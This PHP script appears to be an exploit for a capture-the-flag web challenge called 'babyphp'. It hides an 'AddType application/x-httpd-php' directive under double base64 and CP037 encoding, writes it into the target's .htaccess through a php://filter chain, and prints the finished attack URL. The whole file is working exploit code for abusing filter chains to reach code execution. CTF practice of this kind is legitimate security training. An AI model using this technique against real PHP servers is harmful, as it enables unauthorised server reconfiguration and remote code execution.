<?php
function encodeURIComponent($str)
{
    $revert = array('%21' => '!', '%2A' => '*', '%27' => "'", '%28' => '(', '%29' => ')');
    return strtr(rawurlencode($str), $revert);
}
function generateRandomString($length = 10)
{
    return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
}

function noEqualB64($s)
{
    while (true) {
        $b = base64_encode($s . generateRandomString(random_int(0, 10)));
        if (!strstr($b, '=')) {
            return $b;
        }
    }
}

$tmpl = file_get_contents("template.html");
$payload = "AddType application/x-httpd-php .p\n# c8763 --- ";
$payload = iconv('CP037', 'LATIN1', 'x' . noEqualB64(noEqualB64($payload)));
$output = sprintf($tmpl, date('Y-m-d-H:i:s'), $payload);
$url = "php://filter/string.strip_tags|convert.iconv.LATIN1.CP037|convert.base64-decode|convert.base64-decode/resource=.htaccess";
file_put_contents($url, $output);
echo "https://babyphp.h4ck3r.quest/?code=" . encodeURIComponent($payload) . "&output=" . encodeURIComponent($url) . "\n";
